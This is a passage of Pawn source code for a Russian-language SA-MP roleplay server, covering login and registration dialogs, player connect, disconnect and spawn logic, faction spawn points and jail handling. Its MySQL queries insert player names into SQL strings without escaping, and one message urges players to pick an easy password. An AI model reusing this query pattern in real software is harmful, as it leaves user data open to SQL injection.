			format(str,sizeof(str),"INSERT INTO "T_ATM" (ID, aX, aY, aZ, arX, arY, arZ) VALUES (%i,'%f','%f','%f','%f', '%f', '%f')",
			TOTALATM,ATMInfo[TOTALATM][aX],ATMInfo[TOTALATM][aY],ATMInfo[TOTALATM][aZ], ATMInfo[TOTALATM][arX], ATMInfo[TOTALATM][arY], ATMInfo[TOTALATM][arZ]);
			mysql_query(str);
		}
		if(response == EDIT_RESPONSE_CANCEL)
		{
			DeletePVar(playerid, "LoadATM");
			SendClientMessage(playerid, COLOR_LIGHTRED, "Установка банкомата отменена");
			DestroyObject(GetPVarInt(playerid, "LoadATM")-1);
			CancelEdit(playerid);
		}
		return true;
	}
	if(response == EDIT_RESPONSE_CANCEL)
	{
		DestroyObject(objectid);
		CancelEdit(playerid);
	}
	if(response == EDIT_RESPONSE_FINAL)
	{
		printf("CreateDynamicObject(%i, %.2f, %.2f, %.2f, %.2f, %.2f, %.2f);",objectid,fX, fY, fZ, fRotX, fRotY, fRotZ);
		CancelEdit(playerid);
	}
	return true;
}

public OnGameModeExit()
{
	print("===========GameMode Exit!=============");
	KillTimer(secupdate);
	KillTimer(badengine);
	mysql_close();
	UnloadContent();
	GameModeLoaded = false;
	print("===========GameMode EXITED!=============");
	return true;
}
public ShowLogin(playerid)
{
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
	mysql_query(query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
		format(totalstring, 256, "{ffffff}Добро пожаловать на {1E90FF}"Namemode"\n{ffffff}Этот аккаунт зарегистрирован.\n\n{ffffff}Логин: {1E90FF}%s\n{ffffff}Ваш Пинг: {daa520}%d\n{ffffff}Введите ваш пароль:",PlayerInfo[playerid][pSendername],GetPlayerPing(playerid));
		ShowPlayerDialog(playerid, D_LOGIN, 3, "{FF9900}Авторизация", totalstring, "Принять","Отмена");
	}
	else
	{
		format(totalstring, 300, "{ffffff}Добро пожаловать на {1E90FF}"Namemode"\n{ffffff}Этот аккаунт не зарегистрирован.\n\nЛогин: {1E90FF}%s\n{ffffff}Введите пароль и нажмите \"Далее\".\n\nПримечания:\n- Пароль чувствителен к регистру.\n- Длина пароля от 4 до 16 символов.\n- В пароле можно использовать латинские символы.",PlayerInfo[playerid][pSendername]);
		ShowPlayerDialog(playerid, D_REGISTER, DIALOG_STYLE_INPUT, "{1E90FF}Регистрация", totalstring, "Далее","Отмена");
		SendClientMessage(playerid, COLOR_ORANGE, "Придумайте себе легкий пароль, введите его в окошко");
	}
	mysql_free_result();
}
public OnPlayerRequestClass(playerid, classid)
{
	SetPlayerCameraPos(playerid,2020.4767,1203.1107,59.2244);
	SetPlayerCameraLookAt(playerid,2143.4326,1135.3274,59.3245);
	PlayerSpawned[playerid] = 0;
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,0,0,0,0,0);
	if(PlayerLogged[playerid] == 1)
	{
		SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 0, 0, 0, 1.0, -1, -1, -1, -1, -1, -1);
		return SpawnPlayer(playerid);

	}
	else SetTimerEx("FunctionsTimer", 1000, false, "id", playerid,1);
	return true;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(IsTextInvalid(cmdtext)) printf("CMDLOG: ВОЗМОЖНА АТАКА: %s",cmdtext);
	SetPVarInt(playerid,"AntiFlood",gettime() + 2);
	printf("Игрок %s только что использовал команду \"%s\"", PlayerInfo[playerid][pSendername], cmdtext);
	return true;
}
public OnPlayerConnect(playerid)
{
	if(playerid == INVALID_PLAYER_ID) return GKick(playerid);
	ResetStats(playerid);
	new playername[32];
	GetPlayerName(playerid,playername,32);
	format(PlayerInfo[playerid][pSendername],MAX_PLAYER_NAME,playername);
	if(IsLoginInvalid(playername)) return KickEx(playerid,12011);
	if(GameModeLoaded == false)
	{
		Kick(playerid);
	}
	for(new o; o < 24; o++)
    {
	     send(playerid, "");
    }
	new IP1[16],IP2[16];
	GetPlayerIp(playerid, IP1, sizeof(IP1));
	for(new i=0; i<GetMaxPlayers(); i++)
	{
		if(playerid == i || !IsPlayerConnected(i)) continue;
		GetPlayerIp(i, IP2, sizeof(IP2));
		if(!strcmp(IP1, IP2, true)) return KickEx(playerid,65435);
	}
	ResetWeapon(playerid);
	CheckBanList(playerid);
	CreateTextDraws(playerid);
	RemoveBuild(playerid);
	SetPVarInt(playerid, "AntiBreik", 500);
	//--------[CAPTURE-SYSTEM]--------//
	ScoreCapt[playerid] = TextDrawCreate(14.000000, 260.000000, "Time:");
	TextDrawBackgroundColor(ScoreCapt[playerid], 255);
	TextDrawFont(ScoreCapt[playerid], 1);
	TextDrawLetterSize(ScoreCapt[playerid], 0.500000, 1.000000);
	TextDrawColor(ScoreCapt[playerid], -1);
	TextDrawSetOutline(ScoreCapt[playerid], 1);
	TextDrawSetProportional(ScoreCapt[playerid], 1);

	CaptTime[playerid] = TextDrawCreate(75.000000, 260.000000, "10:00");
	TextDrawBackgroundColor(CaptTime[playerid], 255);
	TextDrawFont(CaptTime[playerid], 1);
	TextDrawLetterSize(CaptTime[playerid], 0.500000, 1.000000);
	TextDrawColor(CaptTime[playerid], -1);
	TextDrawSetOutline(CaptTime[playerid], 1);
	TextDrawSetProportional(CaptTime[playerid], 1);
	BandaCapt1a[playerid] = TextDrawCreate(14.000000, 276.000000, "_");
	TextDrawBackgroundColor(BandaCapt1a[playerid], 255);
	TextDrawFont(BandaCapt1a[playerid], 1);
	TextDrawLetterSize(BandaCapt1a[playerid], 0.500000, 1.000000);
	TextDrawColor(BandaCapt1a[playerid], -1);
	TextDrawSetOutline(BandaCapt1a[playerid], 1);
	TextDrawSetProportional(BandaCapt1a[playerid], 1);
	BandaCapt2a[playerid] = TextDrawCreate(14.000000, 293.000000, "_");
	TextDrawBackgroundColor(BandaCapt2a[playerid], 255);
	TextDrawFont(BandaCapt2a[playerid], 1);
	TextDrawLetterSize(BandaCapt2a[playerid], 0.500000, 1.000000);
	TextDrawColor(BandaCapt2a[playerid], -1);
	TextDrawSetOutline(BandaCapt2a[playerid], 1);
	TextDrawSetProportional(BandaCapt2a[playerid], 1);
	ScoreCapt1a[playerid] = TextDrawCreate(190.000000, 277.000000, "0");
	TextDrawBackgroundColor(ScoreCapt1a[playerid], 255);
	TextDrawFont(ScoreCapt1a[playerid], 1);
	TextDrawLetterSize(ScoreCapt1a[playerid], 0.500000, 1.000000);
	TextDrawColor(ScoreCapt1a[playerid], 0xFF0000FF);
	TextDrawSetOutline(ScoreCapt1a[playerid], 1);
	TextDrawSetProportional(ScoreCapt1a[playerid], 1);
	Textdraw4[playerid] = TextDrawCreate(211.000000, 310.000000, "_");
	TextDrawUseBox(Textdraw4[playerid], 1);
	TextDrawTextSize(Textdraw4[playerid], 5.000000, 200.000000);
	TextDrawLetterSize(Textdraw4[playerid], 0.240000, -7.000000);
	TextDrawBoxColor(Textdraw4[playerid], COLOR_BOX);
	ScoreCapt2a[playerid] = TextDrawCreate(190.000000, 293.000000, "0");
	TextDrawBackgroundColor(ScoreCapt2a[playerid], 255);
	TextDrawFont(ScoreCapt2a[playerid], 1);
	TextDrawLetterSize(ScoreCapt2a[playerid], 0.500000, 1.000000);
	TextDrawColor(ScoreCapt2a[playerid], 0xFF0000FF);
	TextDrawSetOutline(ScoreCapt2a[playerid], 1);
	TextDrawSetProportional(ScoreCapt2a[playerid], 1);
	//--------[CAPTURE-SYSTEM-END]--------//
	for(new i = 1;i<=TOTALGZ;i++) GangZoneShowForPlayer(playerid,GZInfo[i][id],GetGangZoneColor(i));
	GangZoneShowForPlayer(playerid, Army[0], COLOR_YELLOW2);
	SetPlayerColor(playerid, COLOR_GREY);
	format(totalstring, 128, "[A] Игрок %s (ID: %d) зашел на сервер",playername, playerid);
	SendAdminMessage(COLOR_BLUE, totalstring);
	ResetCarInfo(playerid);
	rendlodk[playerid] = 0;
	return true;
}
public OnPlayerDisconnect(playerid, reason)
{
    PlayerInfo[playerid][pAdminDuty] = 0;
    if(GetPVarInt(playerid, "Kick") != 0) KillTimer(GetPVarInt(playerid, "Kick"));
	KillTimer(PickupTimer[playerid]);  // завершаем при выходе
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
	if(GetPVarInt(playerid,"CREATEVEH") > 0)
	{
		DestroyVehicle(GetPVarInt(playerid,"CREATEVEH"));
		DeletePVar(playerid,"CREATEVEH");
	}
	if(GetPVarInt(playerid,"PEREVOZ") > 0)
	{
		DestroyVehicle(GetPVarInt(playerid,"PEREVOZVEH"));
		DeletePVar(playerid,"PEREVOZ");
		DeletePVar(playerid,"PEREVOZVEH");
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(GetPVarInt(playerid,"PlayerCar") > 0)
	{
		SaveVehicle(playerid);
		DestroyVehicle(GetPVarInt(playerid,"PlayerCar"));
		DeletePVar(playerid,"PlayerCar");
	}
	if(GetPVarInt(playerid, "CUFFED") == 1)
	{
		new string[80];
		format(string, sizeof(string), "Игрок %s, вышел из игры при аресте. ( + 30 минут заключения )", sendername(playerid)); // Name(playerid) заменяйте на свою функция определения ника.
		SendClientMessageToAll(0x33AA33FF, string);
		PlayerInfo[playerid][pJail] = 1; // садим в тюрьму игрока. ( если у вас другая переменная, отвечающая за кпз - заменяйте на свою. )
		PlayerInfo[playerid][pJailTime] = 3600; // 3600 - количество секунд, на которое садим игрока. ( если у вас другая переменная, отвечающая за кпз - заменяйте на свою. )
		SetPlayerWantedLevel(playerid, 0);
	}
	if(PlayerLogged[playerid]) SetPlayerInt(PlayerInfo[playerid][pSendername], "online", 0);
	SaveAccount(playerid);
	TextDrawDestroy(FuelShow[playerid]);
	TextDrawDestroy(SpeedShow[playerid]);
	TextDrawDestroy(HealthShow[playerid]);
	TextDrawDestroy(StatusShow[playerid]);
	TextDrawDestroy(Speed2Show[playerid]);
	TextDrawDestroy(EngineShow[playerid]);
	TextDrawDestroy(VehNazv[playerid]);
	TextDrawDestroy(VehCost[playerid]);
	TextDrawHideForPlayer(playerid,ButtonLeft);
	TextDrawHideForPlayer(playerid,ButtonRight);
	TextDrawHideForPlayer(playerid,ButtonSelect);
	TextDrawHideForPlayer(playerid,ButtonCancel);
	CancelSelectTextDraw(playerid);
	if(GetPVarInt(playerid, "ProductID") > 0)
	{
		DisablePlayerRaceCheckpoint(playerid);
		Delete3DTextLabel(ProductInfo[GetPVarInt(playerid, "ProductID")][pText3D]);
		ProductInfo[GetPVarInt(playerid, "ProductID")][pStatus] = false;
		DeletePVar(playerid, "ProductID");
	}
	if(GetPVarInt(playerid, "FuelID") > 0)
	{
		DisablePlayerRaceCheckpoint(playerid);
		Delete3DTextLabel(FuelInfo[GetPVarInt(playerid, "FuelID")][pText3D]);
		FuelInfo[GetPVarInt(playerid, "FuelID")][pStatus] = false;
		DeletePVar(playerid, "FuelID");
	}
	if(GetPVarInt(playerid, "PriceBus") > 0)
	{
		PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "BusMoney");
		Delete3DTextLabel(BusText3D[playerid]);
	}
	if(GetPVarInt(playerid, "FactoryPlace") > 0)
  	{
	    new i = GetPVarInt(playerid, "FactoryPlace")-1;
	    StatusFactory[i] = false;
	    Delete3DTextLabel(InFactory3DText[i]);
	    DeletePVar(playerid, "FactoryPlace");
	    DeletePVar(playerid, "MinerCount");
 	}
 	if(GetPVarInt(playerid, "FactoryPlaceSF") > 0)
  	{
     	new i = GetPVarInt(playerid, "FactoryPlaceSF")-1;
	    StatusFactorySF[i] = false;
	    Delete3DTextLabel(FactorySFText3D[i]);
	    DeletePVar(playerid, "FactoryPlaceSF");
	    DeletePVar(playerid, "MinerCount");
	    DeletePVar(playerid, "FactorySlot");
		DeletePVar(playerid, "FactoryGunSF");
		DisablePlayerCheckpoint(playerid);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid,3);
		SendMes(playerid, COLOR_LIGHTRED, "Вы закончили работать");
    }
	if(GetPVarInt(playerid, "PriceTaxi") > 0)
	{
		PlayerInfo[playerid][pPayCheck] += GetPVarInt(playerid, "TaxiMoney");
		Delete3DTextLabel(TaxiText3D[playerid]);
	}
	KillPlayerTimers(playerid);
	if(rendlodk[playerid] != 0)
	{
	  DestroyVehicle(vehiclek[playerid]);
	  rendlodk[playerid] = 0;
	}
	return true;
}
public OnPlayerSpawn(playerid)
{
	if(PlayerLogged[playerid] == 0) return GKick(playerid);
	SetPlayerVirtualWorld(playerid,0);
	PlayerPlaySound(playerid,1184,0.0,0.0,0.0);
	SetPVarInt(playerid,"K_Times",0);
	SetPVarInt(playerid, "AntiBreik", 3);
	SetPlayerSkills(playerid);
	SetHealth(playerid,60.00);
	Shaht[playerid] = 0;
    Zavod[playerid] = 0;
    ZPerevoz[playerid] = 0;

	if(animload[playerid] == false)
	{
    	PreloadAnimLib(playerid,"BOMBER");
    	PreloadAnimLib(playerid,"BD_FIRE");
    	PreloadAnimLib(playerid,"RAPPING");
    	PreloadAnimLib(playerid,"SHOP");
    	PreloadAnimLib(playerid,"BEACH");
    	PreloadAnimLib(playerid,"SMOKING");
    	PreloadAnimLib(playerid,"FOOD");
    	PreloadAnimLib(playerid,"ON_LOOKERS");
    	PreloadAnimLib(playerid,"DEALER");
    	PreloadAnimLib(playerid,"CRACK");
    	PreloadAnimLib(playerid,"CARRY");
    	PreloadAnimLib(playerid,"CASINO");
    	PreloadAnimLib(playerid,"COP_AMBIENT");
    	PreloadAnimLib(playerid,"PARK");
    	PreloadAnimLib(playerid,"INT_HOUSE");
    	PreloadAnimLib(playerid,"FOOD");
    	PreloadAnimLib(playerid,"CRIB");
   		PreloadAnimLib(playerid,"ROB_BANK");
   		PreloadAnimLib(playerid,"JST_BUISNESS");
    	PreloadAnimLib(playerid,"PED");
    	PreloadAnimLib(playerid,"OTB");
    	PreloadAnimLib(playerid,"BUDDY");
    	animload[playerid] = true;
	}
	if(PlayerInfo[playerid][pFightStyle] != 0)
	{
		SetPlayerFightingStyle(playerid,PlayerInfo[playerid][pFightStyle]);
	}
	else SetPlayerFightingStyle(playerid,0);
	GunCheckTime[playerid] = 5;
	if(GetPVarInt(playerid, "SpecBool") == 1)
	{
		DeletePVar(playerid, "SpecBool");
		new Float:X = GetPVarFloat(playerid, "SpecX"), Float:Y = GetPVarFloat(playerid, "SpecY"), Float:Z = GetPVarFloat(playerid, "SpecZ"),
		Float:FA = GetPVarFloat(playerid, "SpecFA"), inter = GetPVarInt(playerid, "SpecInt"), world = GetPVarInt(playerid, "SpecWorld");
		DeletePVar(playerid, "SpecX");
		DeletePVar(playerid, "SpecY");
		DeletePVar(playerid, "SpecZ");
		DeletePVar(playerid, "SpecFA");
		DeletePVar(playerid, "SpecInt");
		DeletePVar(playerid, "SpecWorld");
		SetPlayerPos(playerid, X, Y, Z);
		SetPlayerFacingAngle(playerid, FA);
		SetPlayerVirtualWorld(playerid, world);
		SetPlayerInterior(playerid, inter);
		SetPlayerTeamColor(playerid);
		SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
		ResetWeapon(playerid);
		SetMoney(playerid, PlayerInfo[playerid][pCash]);
		LoadPWeapon(playerid);
		if(PlayerInfo[playerid][pWanted] > 0) SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWanted]);
		if(PlayerInfo[playerid][pChar] > 0) SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
		else if(Oldskin2[playerid] > 0) SetPlayerSkin(playerid,Oldskin2[playerid]), SendClientMessage(playerid,COLOR_BLUE,"");
		else SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
		return true;
	}
	SetMoney(playerid, PlayerInfo[playerid][pCash]);
	SetPlayerTeamColor(playerid);
	ResetWeapon(playerid);
	LoadPWeapon(playerid);
	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	if(PlayerInfo[playerid][pWanted] > 0) SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWanted]);
	if(PlayerLogged[playerid] == 0) SendClientMessage(playerid, COLOR_LIGHTRED, PlayerNeedToLoggedForToPlay), GKick(playerid);
	if(PlayerInfo[playerid][pChar] > 0) SetPlayerSkin(playerid,PlayerInfo[playerid][pChar]);
	else SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	if(ClothesRound[playerid] == 1)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Что бы просматривать одежду, используйте стрелочки на экране!");
		SetPlayerVirtualWorld(playerid, playerid);
		SetPlayerInterior(playerid,14);
		SetPlayerPos(playerid,208.4520,-160.8391,1000.5234);
		SetPlayerFacingAngle(playerid,180.9319);
		SetPlayerCameraPos(playerid, 207.6285, -166.3627, 1003.5407);
		SetPlayerCameraLookAt(playerid, 207.6098, -165.3643, 1003.1712);
		ApplyAnimation(playerid,"DEALER"," DEALER_IDLE ",4.1,1,1,1,1,1);
		TogglePlayerControllable(playerid, 0);
		TextDrawShowForPlayer(playerid,ButtonLeft);
		TextDrawShowForPlayer(playerid,ButtonRight);
		TextDrawShowForPlayer(playerid,ButtonSelect);
		SelectTextDraw(playerid, 0xFF4040AA);
		SetHealth(playerid,100.00);
		if(PlayerInfo[playerid][pSex] == 1) SetPlayerSkin(playerid, JoinReg[0][0]), SelectCharRegID[playerid] = 1, ChosenSkin[playerid] = JoinReg[0][0];
		else SetPlayerSkin(playerid, JoinReg[5][0]), SelectCharRegID[playerid] = 1, ChosenSkin[playerid] = JoinReg[5][0];
	}
	else if(ClothesRound[playerid] == 2)
	{
		if(PlayerInfo[playerid][pMember] != F_CASINO)
		{
			if(PlayerInfo[playerid][pMember] == F_REDDRAGON)
			{
				PlayerInfo[playerid][pChar] = 189;
				SetPlayerSkin(playerid, 189);
				SelectCharPlace[playerid] = 0;
				SelectCharID[playerid] = 0;
				ClothesRound[playerid] = 0;
				SpawnPlayer(playerid);
				SendClientMessage(playerid, COLOR_YELLOW, "Добро пожаловать в коллектив казино Red Dragon");
			}
			else
			{
				SendClientMessage(playerid, COLOR_YELLOW, "Чтобы просматривать одежду, используйте стрелочку =>, для выбора нажмите 'SELECT'");
				SetPlayerVirtualWorld(playerid, playerid);
				SetPlayerInterior(playerid,14);
				SetPlayerPos(playerid,208.4520,-160.8391,1000.5234);
				SetPlayerFacingAngle(playerid,180.9319);
				SetPlayerCameraPos(playerid, 207.6285, -166.3627, 1003.5407);
				SetPlayerCameraLookAt(playerid, 207.6098, -165.3643, 1003.1712);
				ApplyAnimation(playerid,"DEALER"," DEALER_IDLE ",4.1,1,1,1,1,1);
				TogglePlayerControllable(playerid, 0);
				SelectTextDraw(playerid, 0xFF4040AA);
				//TextDrawShowForPlayer(playerid,ButtonLeft);
				TextDrawShowForPlayer(playerid,ButtonRight);
				TextDrawShowForPlayer(playerid,ButtonSelect);
				if(SelectCharID[playerid] == F_MAYOR) SetPlayerSkin(playerid, JoinPed[0][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[0][0];
				if(SelectCharID[playerid] == F_POLICE_LS || SelectCharID[playerid] == F_POLICE_LS) SetPlayerSkin(playerid, JoinPed[6][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[6][0];
				if(SelectCharID[playerid] == F_FBI) SetPlayerSkin(playerid, JoinPed[14][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[14][0];
				if(SelectCharID[playerid] == F_HOSPITAL) SetPlayerSkin(playerid, JoinPed[19][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[19][0];
				if(SelectCharID[playerid] == F_LIC) SetPlayerSkin(playerid, JoinPed[25][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[25][0];
				if(SelectCharID[playerid] == F_GROVE) SetPlayerSkin(playerid, JoinPed[36][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[36][0];
				if(SelectCharID[playerid] == F_BALLAS) SetPlayerSkin(playerid, JoinPed[32][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[32][0];
				if(SelectCharID[playerid] == F_AZTECAS) SetPlayerSkin(playerid, JoinPed[43][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[43][0];
				if(SelectCharID[playerid] == F_VAGOS) SetPlayerSkin(playerid, JoinPed[47][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[47][0];
				if(SelectCharID[playerid] == F_RIFA) SetPlayerSkin(playerid, JoinPed[51][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[51][0];
				if(SelectCharID[playerid] == F_ARMY) SetPlayerSkin(playerid, JoinPed[30][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[30][0];
				if(SelectCharID[playerid] == F_YAKUZA) SetPlayerSkin(playerid, JoinPed[58][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[58][0];
				if(SelectCharID[playerid] == F_RM) SetPlayerSkin(playerid, JoinPed[65][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[65][0];
				if(SelectCharID[playerid] == F_LCN) SetPlayerSkin(playerid, JoinPed[71][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[71][0];
				if(SelectCharID[playerid] == F_UNITEDNEWS) SetPlayerSkin(playerid, JoinPed[75][0]),SelectCharPlace[playerid] = 1, ChosenSkin[playerid] = JoinPed[75][0];
			}
		}
		else
		{
			PlayerInfo[playerid][pChar] = 0;
			SelectCharPlace[playerid] = 0;
			SelectCharID[playerid] = 0;
			ClothesRound[playerid] = 0;
			SpawnPlayer(playerid);
			SendClientMessage(playerid, COLOR_YELLOW, "Добро пожаловать в коллектив казино Caligula");
		}
	}
	else if(ClothesRound[playerid] == 3)
	{
		new string[128];
		SendClientMessage(playerid, COLOR_YELLOW, "Выберите себе подходящую одежду, после выбора нажмите 'SELECT', для отмены нажмите 'CANCEL'");
		SendClientMessage(playerid, COLOR_LIGHTRED, "Чтобы просмотреть одежду, используйте стрелочки <= или =>");
		SetPlayerVirtualWorld(playerid, playerid);
		SetPlayerInterior(playerid,14);
		SetPlayerPos(playerid,208.4520,-160.8391,1000.5234);
		SetPlayerFacingAngle(playerid,180.9319);
		SetPlayerCameraPos(playerid, 207.6285, -166.3627, 1003.5407);
		SetPlayerCameraLookAt(playerid, 207.6098, -165.3643, 1003.1712);
		ApplyAnimation(playerid,"DEALER"," DEALER_IDLE ",4.1,1,1,1,1,1);
		TogglePlayerControllable(playerid, 0);
		TextDrawShowForPlayer(playerid,ButtonRight);
		TextDrawShowForPlayer(playerid,ButtonSelect);
		TextDrawShowForPlayer(playerid,ButtonCancel);
		TextDrawShowForPlayer(playerid,ButtonLeft);
		SelectTextDraw(playerid, 0xFF4040AA);
		if(PlayerInfo[playerid][pSex] == 1)
		{
			SelectCharPlace[playerid] = 0;
			SetPlayerSkin(playerid, JoinShopM[SelectCharPlace[playerid]][0]);
			format(string, 128, "~b~~n~~n~~n~~n~~n~~n~PRICE: ~w~%i",JoinShopM[SelectCharPlace[playerid]][1]);
		}
		else
		{
			SelectCharPlace[playerid] = 0;
			SetPlayerSkin(playerid, JoinShopF[SelectCharPlace[playerid]][0]);
			format(string, 128, "~b~~n~~n~~n~~n~~n~~n~PRICE: ~w~%i",JoinShopF[SelectCharPlace[playerid]][1]);
		}
		GameTextForPlayer(playerid, string, 2000, 3);
	}
	else
	{
		if(PlayerInfo[playerid][pJail] == 1)
		{
			SetPlayerInterior(playerid, 6);
			SetPlayerPos(playerid,264.1425,77.4712,1001.0391);
			SetPlayerFacingAngle(playerid, 263.0160);
			new string[128];
			format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
			GameTextForPlayer(playerid, string, 1000, 3);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Вы еще не отсидели свой тюремный срок");
			return true;
		}
		if(PlayerInfo[playerid][pJail] == 2)
		{
			SetPlayerInterior(playerid, 10);
			SetPlayerPos(playerid,219.5400,109.9767,999.0156);
			SetPlayerFacingAngle(playerid, 1.0000);
			new string[128];
			format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
			GameTextForPlayer(playerid, string, 1000, 3);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Вы еще не отсидели свой тюремный срок");
			return true;
		}
		if(PlayerInfo[playerid][pJail] == 3)
		{
			SetPlayerInterior(playerid, 3);
			SetPlayerPos(playerid,285.7703,286.7446,996.5789);
			SetPlayerFacingAngle(playerid, 0.0000);
			new string[128];
			format(string, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%s", PlayerInfo[playerid][pJailTime]-10);
			GameTextForPlayer(playerid, string, 1000, 3);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Вы еще не отсидели свой тюремный срок");
			return true;
		}
		else if(PlayerInfo[playerid][pHospital] == 1)
		{
			TogglePlayerControllable(playerid,false);
			SetTimerEx("PlayerToggle", 1600, false, "d", playerid);
			SetHealth(playerid, 15.0);
			SetPlayerFacingAngle(playerid, 90);
			SetPlayerInterior(playerid, 5);
			SetPlayerVirtualWorld(playerid,1);
			SetPlayerPos(playerid,1182.3405,-1354.2379,1584.9719);
			return true;
		}
		for(new i = 1; i <= TOTALHOUSE;i++)
		{
			if(!strcmp(HouseInfo[i][hOwner],PlayerInfo[playerid][pSendername],true))
			{
				if(PlayerInfo[playerid][pSpawnChange] != 0)
				{
					SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
					SetPlayerInterior(playerid,HouseInfo[i][hInt]);
					SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
					SetPVarInt(playerid, "PlayerHouse", i);
					return true;
				}
			}
		}
		if(PlayerInfo[playerid][pMember] == 0)
		{
			if(PlayerInfo[playerid][pLevel] >= 1 && PlayerInfo[playerid][pLevel] <= 10000)
			{
				TogglePlayerControllable(playerid,false);
				SetPlayerPos(playerid,1104.2780,-1796.5244,15.5644);
				SetPlayerFacingAngle(playerid, 89.4026);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(playerid, 0);
				SetTimerEx("PlayerToggle", 1000, false, "d", playerid);
				return true;
			}
		}
		if(PlayerInfo[playerid][pMember] == F_MAYOR)
		{
			SetPlayerPos(playerid,337.1920,193.5128,1014.1797);
			SetPlayerFacingAngle(playerid, 265.8);
			SetPlayerInterior(playerid,3);
			SetPlayerVirtualWorld(playerid, 1);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_POLICE_LS)
		{
			SetPlayerPos(playerid,234.1521,71.5594,1005.0391);
			SetPlayerFacingAngle(playerid, 358.0);
			SetPlayerInterior(playerid, 6);
			SetPlayerVirtualWorld(playerid, 0);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_POLICE_SF)
		{
			SetPlayerPos(playerid,225.1647,121.0442,999.0786);
			SetPlayerFacingAngle(playerid, 89.0);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 0);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_FBI)
		{
			SetPlayerPos(playerid,323.5093,286.0427,1007.3959);
			SetPlayerFacingAngle(playerid, 359.3);
			SetPlayerInterior(playerid, 3);
			SetPlayerVirtualWorld(playerid, 0);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_HOSPITAL)
		{
			SetPlayerPos(playerid,1184.77,-1323.9792,1584.0019);
			SetPlayerFacingAngle(playerid, 90.0);
			SetPlayerInterior(playerid, 5);
			SetPlayerVirtualWorld(playerid, 1);
			return true;
		}
		if(PlayerInfo[playerid][pMember] == F_LIC)
		{
			SetPlayerPos(playerid,-2032.8049,-117.4445,1035.1719);
			SetPlayerFacingAngle(playerid, 269.9);
			SetPlayerInterior(playerid, 3);
			SetPlayerVirtualWorld(playerid, 1);
			return true;
		}
		else if(PlayerInfo[playerid][pMember] == F_GROVE && GetPVarInt(playerid,"Hospital") == 0)
		{
			t_SetPlayerPos(playerid,2483.2910,-1637.9647,14.3169);
			SetPlayerFacingAngle(playerid, 225.2027);
			SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPVarInt(playerid,"Hospital",0);
		    return true;
		}
		else if(PlayerInfo[playerid][pMember] == F_BALLAS && GetPVarInt(playerid,"Hospital") == 0)
		{
			t_SetPlayerPos(playerid,2488.5366,-1987.3193,13.8949);
			SetPlayerFacingAngle(playerid, 130.5200);
			SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPVarInt(playerid,"Hospital",0);
		    return true;
		}
		else if(PlayerInfo[playerid][pMember] == F_RIFA && GetPVarInt(playerid,"Hospital") == 0)
		{
			t_SetPlayerPos(playerid,2172.1450,-1780.1101,13.5756);
			SetPlayerFacingAngle(playerid, 189.2710);
			SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPVarInt(playerid,"Hospital",0);
		    return true;
		}
		else if(PlayerInfo[playerid][pMember] == F_AZTECAS && GetPVarInt(playerid,"Hospital") == 0)
		{
			t_SetPlayerPos(playerid,1689.3876,-2094.1104,13.9339);
			SetPlayerFacingAngle(playerid,49.1287);
			SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
